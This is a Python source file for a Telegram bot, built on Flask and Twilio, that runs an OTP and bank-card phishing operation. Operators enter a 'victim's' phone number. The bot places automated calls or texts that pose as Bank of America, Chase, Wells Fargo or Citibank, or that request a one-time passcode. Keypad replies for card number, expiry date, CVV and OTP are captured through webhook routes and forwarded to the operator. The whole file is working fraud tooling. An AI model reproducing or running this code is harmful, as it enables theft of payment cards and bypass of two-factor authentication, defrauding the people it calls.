import flask
from datetime import *
from flask import Flask, session
import requests
import time
import phonenumbers
import telebot
import twilio
from phonenumbers import NumberParseException
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.twiml.messaging_response import MessagingResponse
from flask import Flask, request
from telebot import types
from twilio.rest import Client
import sqlite3
from Database import *
from Info import *

path = 'UsersDatabase.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

# Twilio connection
client = Client(account_sid, auth_token)

# Flask connection
app = Flask(__name__)

# Bot connection
bot = telebot.TeleBot(API_TOKEN, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)

# Process webhook calls
@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(403)

# Handle '/start'
@bot.message_handler(commands=['start'])
def send_welcome(message):
    id = message.from_user.id
    print(f"User ID: {id}")
    print(f"Is Admin: {check_admin(id)}")
    print(f"Is User: {check_user(id)}")
    if check_admin(id) == True:
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="User Mode")
        item2 = types.KeyboardButton(text="Admin Mode")
        keyboard.add(item1)
        keyboard.add(item2)
        send = bot.send_message(message.chat.id, "*Welcome\n\nWould You Like to Be In User or Admin Mode?*", parse_mode='Markdown',
                                reply_markup=keyboard)
        bot.register_next_step_handler(send, usecase2)
    else:
        # Create user if they don't exist
        if not check_user(id):
            create_user(id)
        name = message.from_user.first_name
        send = bot.send_message(message.chat.id, f"*Hey {name} ??*", parse_mode='Markdown')
        send = bot.send_message(message.chat.id, "*??Send Victim's Phone Number??\n\nUse International Format (e.g., +1XXXXXXXXXX) ??*", parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)

def usecase2(message):
    if message.text == 'User Mode':
        name = message.from_user.first_name
        send = bot.send_message(message.chat.id, f"*Hey {name} ??*", parse_mode='Markdown')
        send = bot.send_message(message.chat.id, "*??Send Victim's Phone Number??\n\nUse International Format (e.g., +1XXXXXXXXXX) ??*", parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)
    elif message.text == 'Admin Mode':
        adminfunction(message)

def adminfunction(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Edit access")
    item2 = types.KeyboardButton(text="Check Tables")
    keyboard.add(item1)
    keyboard.add(item2)
    send = bot.send_message(message.chat.id, "*What Would You Like To Do?*", parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(send, edit_access)

def edit_access(message):
    if message.text == 'Edit access':
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="1 : Add Admin")
        item2 = types.KeyboardButton(text="2 : Add User")
        item3 = types.KeyboardButton(text="3 : Delete Admin")
        item4 = types.KeyboardButton(text="4 : Delete User")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        send = bot.send_message(message.chat.id, "*Choose Option:*", parse_mode='Markdown', reply_markup=keyboard)
        bot.register_next_step_handler(send, type_of_user)
    elif message.text == 'Check Tables':
        UserDatatable = fetch_UserData_table()
        Admindatatable = fetch_Admindata_table()
        bot.send_message(message.chat.id, f"*UserData Table:*\n{UserDatatable}", parse_mode='Markdown')
        bot.send_message(message.chat.id, f"*AdminData Table:*\n{Admindatatable}", parse_mode='Markdown')
        send = bot.send_message(message.chat.id, "*Use /start command to continue*", parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 : Add Admin")
def add_admin(message):
    send = bot.send_message(message.chat.id, "*Enter AdminID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, createadmin)

def createadmin(message):
    try:
        adminid = message.text
        create_admin(adminid)
        bot.send_message(message.chat.id, f"*Admin Added ?\n\nUse /start to Continue*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "*Invalid Option ?\nUse /start command*", parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "2 : Add User")
def add_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, create_user_handler)

def create_user_handler(message):
    try:
        userid = message.text
        create_user(userid)
        bot.send_message(message.chat.id, f"*User Added ?\n\nUse /start to Continue*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "*Invalid Option ?\nUse /start command*", parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 : Delete Admin")
def delete_admin(message):
    send = bot.send_message(message.chat.id, "*Enter AdminID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, deleteadmin)

def deleteadmin(message):
    try:
        adminid = message.text
        delete_specific_AdminData(adminid)
        bot.send_message(message.chat.id, f"*Admin Deleted ?\n\nUse /start to Continue*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "*Invalid Option ?\nUse /start command*", parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "4 : Delete User")
def delete_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, deleteuser)

def deleteuser(message):
    try:
        userid = message.text
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"*User Deleted ?\n\nUse /start to Continue*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "*Invalid Option ?\nUse /start command*", parse_mode='Markdown')

def saving_phonenumber(message):
    userid = message.from_user.id
    no_tobesaved = str(message.text).strip()
    # Basic validation: check if input starts with '+' and contains digits
    if not no_tobesaved.startswith('+') or not no_tobesaved[1:].isdigit():
        send = bot.send_message(message.chat.id, "*Invalid Number ? Please use international format (e.g., +1XXXXXXXXXX).*", parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)
        return
    try:
        z = phonenumbers.parse(no_tobesaved, "US")
        if phonenumbers.is_valid_number(z):
            save_phonenumber(no_tobesaved, userid)
            send = bot.send_message(message.chat.id, "*??Number confirmed ??\n\nType OK to Continue*", parse_mode='Markdown')
            bot.register_next_step_handler(send, call_or_sms_or_script)
        else:
            send = bot.send_message(message.chat.id, "*Invalid Number ? Please use a valid US number in international format (e.g., +1XXXXXXXXXX).*", parse_mode='Markdown')
            bot.register_next_step_handler(send, saving_phonenumber)
    except phonenumbers.NumberParseException:
        send = bot.send_message(message.chat.id, "*Invalid Number ? Please use international format (e.g., +1XXXXXXXXXX).*", parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)

def call_or_sms_or_script(message):
    if message.text == 'OK':
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="Call Mode")
        item2 = types.KeyboardButton(text="SMS Mode")
        item3 = types.KeyboardButton(text="Custom Script")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        send = bot.send_message(message.chat.id, "*Choose Mode:*", parse_mode='Markdown', reply_markup=keyboard)
        bot.register_next_step_handler(send, call_sms_script)

def call_sms_script(message):
    userid = message.from_user.id
    if message.text == 'Call Mode':
        call_mode(message)
    elif message.text == 'SMS Mode':
        sms_mode(message)
    elif message.text == 'Custom Script':
        custom_script(message)

def call_mode(message):
    userid = message.from_user.id
    phonenumber = fetch_phonenumber(userid)
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="1 : Bank")
    item2 = types.KeyboardButton(text="2 : OTP")
    item3 = types.KeyboardButton(text="3 : Custom")
    keyboard.add(item1)
    keyboard.add(item2)
    keyboard.add(item3)
    send = bot.send_message(message.chat.id, "*Choose Option:*", parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(send, call_options)

def call_options(message):
    userid = message.from_user.id
    phonenumber = fetch_phonenumber(userid)
    if message.text == '1 : Bank':
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="Bank of America")
        item2 = types.KeyboardButton(text="Chase")
        item3 = types.KeyboardButton(text="Wells Fargo")
        item4 = types.KeyboardButton(text="Citibank")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        send = bot.send_message(message.chat.id, "*Choose Bank:*", parse_mode='Markdown', reply_markup=keyboard)
        bot.register_next_step_handler(send, bank_selection)
    elif message.text == '2 : OTP':
        call = client.calls.create(
            twiml=f'<Response><Gather action="/gather_otp/{userid}" method="POST" numDigits="6"><Say voice="Polly.Joanna">Please enter your one-time passcode.</Say></Gather></Response>',
            to=phonenumber,
            from_='+12057075392'
        )
        bot.send_message(message.chat.id, "*Call Initiated ??\n\nWaiting for OTP...*", parse_mode='Markdown')
    elif message.text == '3 : Custom':
        send = bot.send_message(message.chat.id, "*Enter Custom Script:*", parse_mode='Markdown')
        bot.register_next_step_handler(send, custom_call_script)

def bank_selection(message):
    userid = message.from_user.id
    phonenumber = fetch_phonenumber(userid)
    bank_name = message.text
    save_bankName(bank_name, userid)
    call = client.calls.create(
        twiml=f'<Response><Gather action="/gather_bank/{userid}" method="POST" numDigits="16"><Say voice="Polly.Joanna">Please enter your card number.</Say></Gather></Response>',
        to=phonenumber,
        from_='+12057075392'
    )
    bot.send_message(message.chat.id, "*Call Initiated ??\n\nWaiting for Card Number...*", parse_mode='Markdown')

def sms_mode(message):
    userid = message.from_user.id
    phonenumber = fetch_phonenumber(userid)
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="1 : Bank")
    item2 = types.KeyboardButton(text="2 : OTP")
    item3 = types.KeyboardButton(text="3 : Custom")
    keyboard.add(item1)
    keyboard.add(item2)
    keyboard.add(item3)
    send = bot.send_message(message.chat.id, "*Choose Option:*", parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(send, sms_options)

def sms_options(message):
    userid = message.from_user.id
    phonenumber = fetch_phonenumber(userid)
    if message.text == '1 : Bank':
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="Bank of America")
        item2 = types.KeyboardButton(text="Chase")
        item3 = types.KeyboardButton(text="Wells Fargo")
        item4 = types.KeyboardButton(text="Citibank")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        send = bot.send_message(message.chat.id, "*Choose Bank:*", parse_mode='Markdown', reply_markup=keyboard)
        bot.register_next_step_handler(send, sms_bank_selection)
    elif message.text == '2 : OTP':
        message = client.messages.create(
            body='Please reply with your one-time passcode.',
            from_='+12057075392',
            to=phonenumber
        )
        bot.send_message(message.chat.id, "*SMS Sent ??\n\nWaiting for OTP...*", parse_mode='Markdown')
    elif message.text == '3 : Custom':
        send = bot.send_message(message.chat.id, "*Enter Custom SMS Message:*", parse_mode='Markdown')
        bot.register_next_step_handler(send, custom_sms_script)

def sms_bank_selection(message):
    userid = message.from_user.id
    phonenumber = fetch_phonenumber(userid)
    bank_name = message.text
    save_bankName(bank_name, userid)
    message = client.messages.create(
        body='Please reply with your card number.',
        from_='+12057075392',
        to=phonenumber
    )
    bot.send_message(message.chat.id, "*SMS Sent ??\n\nWaiting for Card Number...*", parse_mode='Markdown')

def custom_script(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id, "*Enter Custom Script:*", parse_mode='Markdown')
    bot.register_next_step_handler(send, save_custom_script)

def save_custom_script(message):
    userid = message.from_user.id
    script = message.text
    save_script(script, userid)
    phonenumber = fetch_phonenumber(userid)
    call = client.calls.create(
        twiml=f'<Response><Say voice="Polly.Joanna">{script}</Say></Response>',
        to=phonenumber,
        from_='+12057075392'
    )
    bot.send_message(message.chat.id, "*Custom Script Call Initiated ??*", parse_mode='Markdown')

def custom_call_script(message):
    userid = message.from_user.id
    script = message.text
    save_script(script, userid)
    phonenumber = fetch_phonenumber(userid)
    call = client.calls.create(
        twiml=f'<Response><Gather action="/gather_custom/{userid}" method="POST"><Say voice="Polly.Joanna">{script}</Say></Gather></Response>',
        to=phonenumber,
        from_='+12057075392'
    )
    bot.send_message(message.chat.id, "*Custom Script Call Initiated ??*", parse_mode='Markdown')

def custom_sms_script(message):
    userid = message.from_user.id
    script = message.text
    save_script(script, userid)
    phonenumber = fetch_phonenumber(userid)
    message = client.messages.create(
        body=script,
        from_='+12057075392',
        to=phonenumber
    )
    bot.send_message(message.chat.id, "*Custom SMS Sent ??*", parse_mode='Markdown')

@app.route('/gather_otp/<userid>', methods=['POST'])
def gather_otp(userid):
    digits = request.form.get('Digits')
    save_otpcode(digits, userid)
    bot.send_message(userid, f"*OTP Received: {digits} ?\n\nUse /start to Continue*", parse_mode='Markdown')
    return ''

@app.route('/gather_bank/<userid>', methods=['POST'])
def gather_bank(userid):
    digits = request.form.get('Digits')
    save_cardnumber(digits, userid)
    resp = VoiceResponse()
    gather = Gather(num_digits=4, action=f'/gather_expiry/{userid}', method='POST')
    gather.say('Please enter your card expiry date.', voice='Polly.Joanna')
    resp.append(gather)
    return str(resp)

@app.route('/gather_expiry/<userid>', methods=['POST'])
def gather_expiry(userid):
    digits = request.form.get('Digits')
    save_cardexpiry(digits, userid)
    resp = VoiceResponse()
    gather = Gather(num_digits=3, action=f'/gather_cvv/{userid}', method='POST')
    gather.say('Please enter your card CVV.', voice='Polly.Joanna')
    resp.append(gather)
    return str(resp)

@app.route('/gather_cvv/<userid>', methods=['POST'])
def gather_cvv(userid):
    digits = request.form.get('Digits')
    save_cardcvv(digits, userid)
    bot.send_message(userid, f"*Card Details Received ?\n\nCard Number: {fetch_cardnumber(userid)}\nExpiry: {fetch_cardexpiry(userid)}\nCVV: {fetch_cardcvv(userid)}\n\nUse /start to Continue*", parse_mode='Markdown')
    return ''

@app.route('/gather_custom/<userid>', methods=['POST'])
def gather_custom(userid):
    digits = request.form.get('Digits')
    save_numbercollected1(digits, userid)
    bot.send_message(userid, f"*Custom Input Received: {digits} ?\n\nUse /start to Continue*", parse_mode='Markdown')
    return ''

@app.route('/sms', methods=['POST'])
def sms_reply():
    from_number = request.form.get('From')
    body = request.form.get('Body')
    userid = fetch_sms_userid(from_number)
    save_otpcode(body, userid)
    bot.send_message(userid, f"*SMS Reply Received: {body} ?\n\nUse /start to Continue*", parse_mode='Markdown')
    return ''

if __name__ == '__main__':
	app.run(port=5000, debug=True)
	"* app.run(debug=True) *"